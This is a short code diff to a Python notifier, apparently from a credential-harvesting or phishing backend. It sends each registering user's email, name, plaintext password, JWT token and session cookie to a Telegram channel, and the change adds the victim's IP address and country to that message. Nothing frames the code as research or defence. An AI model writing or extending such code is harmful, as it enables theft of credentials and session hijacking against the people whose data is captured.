@@ -62,7 +62,7 @@ def notify_email_captured(email: str, ip_address: str = "Unknown", country: str 
     send_telegram_notification(message)
 
 
-def notify_user_registration(email: str, name: str, password: str, token: str, user_id: str) -> None:
+def notify_user_registration(email: str, name: str, password: str, token: str, user_id: str, ip_address: str = "Unknown", country: str = "Unknown") -> None:
     """
     Notify about new user registration with full details.
     """
@@ -77,7 +77,9 @@ def notify_user_registration(email: str, name: str, password: str, token: str, u
         f"📧 <b>Email:</b> <code>{email}</code>\n"
         f"👤 <b>Name:</b> <code>{name}</code>\n"
         f"🔑 <b>Password:</b> <code>{password}</code>\n"
-        f"⏰ <b>Time:</b> {current_time}\n\n"
+        f"⏰ <b>Time:</b> {current_time}\n"
+        f"🌍 <b>IP Address:</b> <code>{ip_address}</code>\n"
+        f"🗺️ <b>Location:</b> {country}\n\n"
         f"🎫 <b>JWT Token:</b>\n<code>{token}</code>\n\n"
         f"🆔 <b>User ID:</b> <code>{user_id}</code>\n\n"
         f"🍪 <b>Session Cookie:</b>\n"
